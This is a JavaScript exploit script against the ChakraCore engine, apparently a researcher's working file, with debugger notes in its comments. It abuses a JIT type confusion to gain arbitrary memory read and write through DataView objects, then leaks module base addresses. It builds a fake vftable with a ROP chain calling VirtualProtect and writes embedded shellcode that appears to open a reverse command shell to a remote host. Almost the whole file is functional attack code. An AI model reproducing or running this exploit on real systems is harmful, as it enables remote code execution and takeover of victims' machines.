// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

dataview1.setUint32(0x0, 0x43434343, true); 
dataview1.setUint32(0x4, 0x43434343, true); 
dataview1.setUint32(0x8, 0x43434343, true); 
dataview1.setUint32(0xc, 0x43434343, true); 
dataview1.setUint32(0x10, 0x43434343, true); 
dataview1.setUint32(0x14, 0x43434343, true); 
dataview1.setUint32(0x18, 0x43434343, true); 
dataview1.setUint32(0x1c, 0x43434343, true); 
dataview1.setUint32(0x20, 0x43434343, true); 
dataview1.setUint32(0x24, 0x43434343, true); 
dataview1.setUint32(0x28, 0x43434343, true); 
dataview1.setUint32(0x2c, 0x43434343, true); 
dataview1.setUint32(0x30, 0x43434343, true); 
dataview1.setUint32(0x34, 0x43434343, true); 
dataview1.setUint32(0x38, 0x43434343, true); 
dataview1.setUint32(0x3c, 0x43434343, true); 
dataview1.setUint32(0x40, 0x43434343, true); 
dataview1.setUint32(0x44, 0x43434343, true); 
dataview1.setUint32(0x48, 0x43434343, true); 
dataview1.setUint32(0x4c, 0x43434343, true); 

dataview2.setUint32(0x0, 0x44444444, true); 
dataview2.setUint32(0x4, 0x44444444, true); 
dataview2.setUint32(0x8, 0x44444444, true); 
dataview2.setUint32(0xc, 0x44444444, true); 

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function testWrites64() {
	dataview1.setUint32(0x0, 0x42424242, true); 	
	dataview1.setUint32(0x4, 0x42424242, true);    
	print("DEBUG - testWrites64");
	/*
0:004> dqs 00000186`1c70e000
00000186`1c70e000  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable' (dataview1)
00000186`1c70e008  00000186`1c6e2040
00000186`1c70e010  00000000`00000000
00000186`1c70e018  00000000`00000000
00000186`1c70e020  00000000`00000100
00000186`1c70e028  00000186`1c6f00a0
00000186`1c70e030  00000000`00000000
00000186`1c70e038  00000186`1c70e040
00000186`1c70e040  42424242`42424242 (dataview2)
00000186`1c70e048  00000186`1c6e2040
00000186`1c70e050  00000000`00000000
00000186`1c70e058  00000000`00000000
00000186`1c70e060  00000000`00000100
00000186`1c70e068  00000186`1c6f00f0
00000186`1c70e070  00000000`00000000
00000186`1c70e078  00000186`1ad6d470 <- dataview1.setUint32 will write the address here
                                     <- dataview2.setUint32 will write to whereever the address is pointing to
0:004> dqs 00000186`1ad6d470
00000186`1ad6d470  44444444`44444444
00000186`1ad6d478  44444444`44444444
	*/
}

function hex(x) {
    x = x.toString(16);
    while (x.length < 8) x = "0"+x
    return x
}

function write64(addressLower64Bit, addressHigher64Bit, valueLower64Bit, valueHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	dataview2.setUint32(0x0, valueLower64Bit, true);		// 4-byte arbitrary write
	dataview2.setUint32(0x4, valueHigher64Bit, true);		// 4-byte arbitrary write
}

function read64(addressLower64Bit, addressHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	
	var read = new Uint32Array(0x10);
	read[0] = dataview2.getUint32(0x0, true);
	read[1] = dataview2.getUint32(0x4, true);
	return read
}

function main() {

    //vtableLo = dataview1.getUint32(0, true);
	//vtableHigh = dataview1.getUint32(4, true);
	//print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    //vtableLo = dataview2.getUint32(0, true);
	//vtableHigh = dataview2.getUint32(4, true);
	//print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));

    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    print("DEBUG - hehe opt() is not marked as 'HOT'"); // ch!WScriptJsrt::EchoCallback
    let o = {a: 0x41414141, b: 0x42424242};             // chakracore!Js::DynamicTypeHandler::SetSlotUnchecked
                                                        // should hit twice   
    print("DEBUG - type confusion incoming...");        // ch!WScriptJsrt::EchoCallback
                                                        // ba w 8 first inline value
    opt(o, o, obj);		  
    print("DEBUG - o.a = obj (obj->vftable)!");         // ch!WScriptJsrt::EchoCallback
                                                        // first inline value should be a pointer to another vftable
    // O-ADDRESS:       o->vftable
    // O-TYPE:          o->type
    // O-INLINE-1:      obj->vftable (o.a)
    // o.a:             obj->vftable 
    // o.b:             obj->type
    // o.c:             obj->auxSlots[0]
    // o.d:             obj->auxSlots[0]+8
    // obj.a:           1
    // obj->auxSlots[0]:1 
    // obj.b:           2
    // obj->auxSlots[1]:2 
    // ...
    // all the above are "pointer to"s
    o.c = dataview1 
    //o.d = 0x42424242 // observe the impact here, will crash program though
    print("DEBUG - set obj->auxSlots to dataview1");       // ch!WScriptJsrt::EchoCallback
    // o.c:               dataview1->vftable
    // obj->auxSlots[0]:  dataview1->vftable
    // obj->auxSlots[7]:  dataview1->buffer
    // obj.h:             dataview1->buffer
    // o.d:               obj->auxSlots[0]+8
    // obj->auxSlots[0]+8:0x42424242
    obj.h = dataview2 // value here corrupted and will be leaked via dataview1
    // dataview1->buffer is set to pointer to dataview2
    print("DEBUG - set dataview1->buffer to dataview2 or whatever you want");

    leakLo = dataview1.getUint32(0, true);
	leakHi = dataview1.getUint32(4, true);
	print("[+] Pointer to DataView->buffer leaked: 0x" + hex(leakHi) + hex(leakLo));

    if (hex(leakHi) + hex(leakLo) === "4343434343434343") {
        print("[*] Exploit failed :(")
        return
    }

    //leakLo = dataview1.getUint32(8, true);
    //leakHi = dataview1.getUint32(0xc, true);
    //print("[+] Pointer to DataView->buffer+8 leaked: 0x" + hex(leakHi) + hex(leakLo));

    //leakLo = dataview1.getUint32(0x10, true);
    //leakHi = dataview1.getUint32(0x14, true);
    //print("[+] Pointer to DataView->buffer+0x10 leaked: 0x" + hex(leakHi) + hex(leakLo));

    //obj.h = new ArrayBuffer(0x10)
    /*
    0:004> dqs 0x00007ffe9b07ef78
    00007ffe`9b07ef78  00007ffe`9a2f2990 chakracore!Js::JavascriptArrayBuffer::Finalize [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\library\arraybuffer.cpp @ 891]
    00007ffe`9b07ef80  00007ffe`9a2f1720 chakracore!Js::JavascriptArrayBuffer::Dispose [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\library\arraybuffer.cpp @ 931]
    00007ffe`9b07ef88  00007ffe`9987b640 chakracore!FinalizableObject::Mark [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 14]
    00007ffe`9b07ef90  00007ffe`99882bc0 chakracore!FinalizableObject::OnMark [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 11]
    00007ffe`9b07ef98  00007ffe`9988ae50 chakracore!FinalizableObject::Trace [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 19]
    00007ffe`9b07efa0  00007ffe`9a61e500 chakracore!Js::DynamicObject::Mark [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamicobject.cpp @ 1070]
    00007ffe`9b07efa8  00007ffe`9a6196f0 chakracore!Js::RecyclableObject::GetPrototypeSpecial [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.cpp @ 168]
    00007ffe`9b07efb0  00007ffe`9a6221b0 chakracore!Js::DynamicObject::GetPropertyId [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 235]
    00007ffe`9b07efb8  00007ffe`9a622160 chakracore!Js::DynamicObject::GetPropertyId [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 230]
    00007ffe`9b07efc0  00007ffe`9a622200 chakracore!Js::DynamicObject::GetPropertyIndex [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 240]
    00007ffe`9b07efc8  00007ffe`9a6220a0 chakracore!Js::DynamicObject::GetPropertyCount [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 212]
    00007ffe`9b07efd0  00007ffe`9a622ad0 chakracore!Js::DynamicObject::HasPropertyQuery [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 247]
    00007ffe`9b07efd8  00007ffe`9a622a10 chakracore!Js::DynamicObject::HasOwnProperty [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 257]
    00007ffe`9b07efe0  00007ffe`9a619b60 chakracore!Js::RecyclableObject::HasOwnPropertyNoHostObject [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.cpp @ 357]
    00007ffe`9b07efe8  00007ffe`99878080 chakracore!Js::RecyclableObject::HasOwnPropertyCheckNoRedecl [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.h @ 297]
    00007ffe`9b07eff0  00007ffe`9988af10 chakracore!Js::RecyclableObject::UseDynamicObjectForNoHostObjectAccess [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.h @ 298]
    */
    var targetObject = new Object()
    
    obj.h = targetObject
    leakLo = dataview1.getUint32(0, true);
    leakHi = dataview1.getUint32(4, true);
    print("[+] Object() Vftable leaked: 0x" + hex(leakHi) + hex(leakLo));
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    obj.h = dataview2;

    vtableLo = dataview1.getUint32(0, true);
    vtableHigh = dataview1.getUint32(4, true);
    print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    //vtableLo = dataview2.getUint32(0, true);
    //vtableHigh = dataview2.getUint32(4, true);
    //print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    chakraLo = dataview1.getUint32(0, true) - 0x1961298 - 0xb98;
    chakraHigh = dataview1.getUint32(4, true);
    print("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    KERNEL32_RaiseException = read64(chakraLo+0x17c0000+0x40, chakraHigh)
    kernel32High = KERNEL32_RaiseException[1]
    kernel32Lo   = KERNEL32_RaiseException[0]-0x00024d70
    print("[+] kernel32.dll base address: 0x" + hex(kernel32High) + hex(kernel32Lo));
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    fakevftableLocationAtDataSectionLo = chakraLo+0x1d38a1c-0x200;
    fakevftableLocationAtDataSectionHigh = chakraHigh;
    print("[+] We will write out fake vftable here: 0x" + hex(fakevftableLocationAtDataSectionHigh) + hex(fakevftableLocationAtDataSectionLo));

    write64(fakevftableLocationAtDataSectionLo+0x88,fakevftableLocationAtDataSectionHigh,chakraLo+0x143e692,chakraHigh) 
    //write64(fakevftableLocationAtDataSectionLo+0x88,fakevftableLocationAtDataSectionHigh,0x44444444,0x44444444) 
    print("[#] Hijack vftable at +0x88 offset :)")
    //0:004> u chakracore+0x143e692
    //chakracore!BackwardPass::ProcessBlock+0x17e2 [c:\users\kali\desktop\chakracore\chakracore\lib\backend\backwardpass.cpp @ 3778]:
    //00007ffe`9babe692 4a94            xchg    rax,rsp
    //00007ffe`9babe694 c3              ret
    //...
    //chakracore!Js::JavascriptOperators::GetterSetter_Impl<int,0>+0x6d [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\language\javascriptoperators.cpp @ 2254]:
    //00007ffe`9ad8dded ff9088000000    call    qword ptr [rax+88h]
    //00007ffe`9ad8ddf3 89442430        mov     dword ptr [rsp+30h],eax
    //(1070.5e4): Access violation - code c0000005 (first chance)
    //First chance exceptions are reported before any exception handling.
    //This exception may be expected and handled.
    //chakracore!Js::JavascriptOperators::GetterSetter_Impl<int,0>+0x6d:
    //00007ffe`9ad8dded ff9088000000    call    qword ptr [rax+88h] ds:00007ffe`9c3b88a4=4444444444444444
    //0:004> ? 00007ffe`9ad8dded-chakracore
    //Evaluate expression: 7396845 = 00000000`0070dded

    // 0x1800404ab: pop rcx ; ret  ;  (1 found)
    // 0x180004fda: pop rdx ; ret  ;  (1 found)
    // 0x18152decc: pop r8 ; ret  ;  (1 found)
    // 0x180041c56: pop r9 ; ret  ;  (1 found)

    counter = 0
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,chakraLo+0x404ab,chakraHigh)    // 0x1800404ab: pop rcx ; ret  ;  (1 found)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,fakevftableLocationAtDataSectionLo+0x90,fakevftableLocationAtDataSectionHigh) // shellcode
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,chakraLo+0x4fda,chakraHigh)     // 0x180004fda: pop rdx ; ret  ;  (1 found)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x1000,0x0) // size
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,chakraLo+0x0152decc,chakraHigh) // 0x18152decc: pop r8 ; ret  ;  (1 found)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x40,0x0) // protection
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,chakraLo+0x41c56,chakraHigh)    // 0x180041c56: pop r9 ; ret  ;  (1 found)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,chakraLo+0x1d38a1c+0x400,chakraHigh) // writeable pointer
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter, fakevftableLocationAtDataSectionHigh,chakraLo+0x41e3c, chakraHigh);   // 0x180041e3c: pop rax ; ret  ;  (1 found)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter, fakevftableLocationAtDataSectionHigh,chakraLo+0x17c0058, chakraHigh); // addressof(KERNEL32!VirtualProtectStub)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter, fakevftableLocationAtDataSectionHigh,chakraLo+0x5806a, chakraHigh);  // 0x18005806a: mov rax, qword [rax] ; ret ; (1 found) 
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter, fakevftableLocationAtDataSectionHigh,chakraLo+0x34ba0, chakraHigh);  // 0x180034ba0: push rax ; ret  ;  (1 found) (same as jmp rax)
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,fakevftableLocationAtDataSectionLo+0x90,fakevftableLocationAtDataSectionHigh) // shellcode
    counter += 8
    print("[#] Stage 1 rop chain to run VirtualAlloc at our stage 2 rop chain area (max 0x80 bytes)")

    counter = 0x90
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x90909090,0x90909090) // shellcode
    counter += 8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x90909090,0x90909090)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xe48348fc,0x00c0e8f0)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x51410000,0x51525041)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xd2314856,0x528b4865)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x528b4860,0x528b4818)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x728b4820,0xb70f4850)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x314d4a4a,0xc03148c9)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x7c613cac,0x41202c02)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x410dc9c1,0xede2c101)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x48514152,0x8b20528b)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x01483c42,0x88808bd0)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x48000000,0x6774c085)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x50d00148,0x4418488b)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x4920408b,0x56e3d001)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x41c9ff48,0x4888348b)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x314dd601,0xc03148c9)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xc9c141ac,0xc101410d)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xf175e038,0x244c034c)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xd1394508,0x4458d875)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x4924408b,0x4166d001)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x44480c8b,0x491c408b)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8b41d001,0x01488804)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x415841d0,0x5a595e58)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x59415841,0x83485a41)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x524120ec,0x4158e0ff)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8b485a59,0xff57e912)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x495dffff,0x327377be)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x0032335f,0x49564100)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8148e689,0x0001a0ec)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xe5894900,0x0002bc49)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xa8c0f604,0x544180d5)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x4ce48949,0xba41f189)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x0726774c,0x894cd5ff)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x010168ea,0x41590000)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x6b8029ba,0x50d5ff00)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xc9314d50,0x48c0314d)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8948c0ff,0xc0ff48c2)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x41c18948,0xdf0feaba)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x48d5ffe0,0x106ac789)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x894c5841,0xf98948e2)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xa599ba41,0xd5ff6174)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x40c48148,0x49000002)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x646d63b8,0x00000000)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x41504100,0xe2894850)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x4d575757,0x0d6ac031)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xe2504159,0x44c766fc)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x01015424,0x24448d48)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x6800c618,0x56e68948)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x41504150,0x49504150)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x5041c0ff,0x4dc8ff49)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x894cc189,0x79ba41c1)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xff863fcc,0xd23148d5)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8bcaff48,0x08ba410e)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xff601d87,0xb5f0bbd5)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xba4156a2,0x9dbd95a6)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x8348d5ff,0x063c28c4)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xfb800a7c,0xbb0575e0)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x6f721347,0x4159006a)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0xd5ffda89,0x90909090)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x90909090,0x90909090)
    counter+=8
    write64(fakevftableLocationAtDataSectionLo+counter,fakevftableLocationAtDataSectionHigh,0x90909090,0x90909090)
    counter+=8

    obj.h = targetObject
    print("[#] Get dataview1->buffer to point to new Object()") // which should be the JavaScript::Object vftable
    dataview1.setUint32(0, fakevftableLocationAtDataSectionLo, true);
    dataview1.setUint32(4, fakevftableLocationAtDataSectionHigh, true);
    print("[#] Get Object() to point to fake vftable instead of original vftable")
    print("[3] Triggering exploit...")
    targetObject["test"] = "test" // trigger

    // trigger chakracore!Js::DynamicObject::SetProperty
    // 0:004> dqs 0x00007ffe9bed88b0+b8 L2
    // 00007ffe`9bed8968  00007ffe`9b483b50 chakracore!Js::DynamicObject::SetProperty [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 295]
    // 00007ffe`9bed8970  00007ffe`9b483a50 chakracore!Js::DynamicObject::SetProperty [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 289
    
    // ch!WScriptJsrt::EchoCallback
    // chakracore!Js::DynamicTypeHandler::SetSlotUnchecked
    // 00000200`68117aa0
    // chakracore+0x143e692
    // C:\Users\kali\Desktop\ChakraCore\ChakraCore\Build\VcBuild\bin\exploit-2.js
}
main();



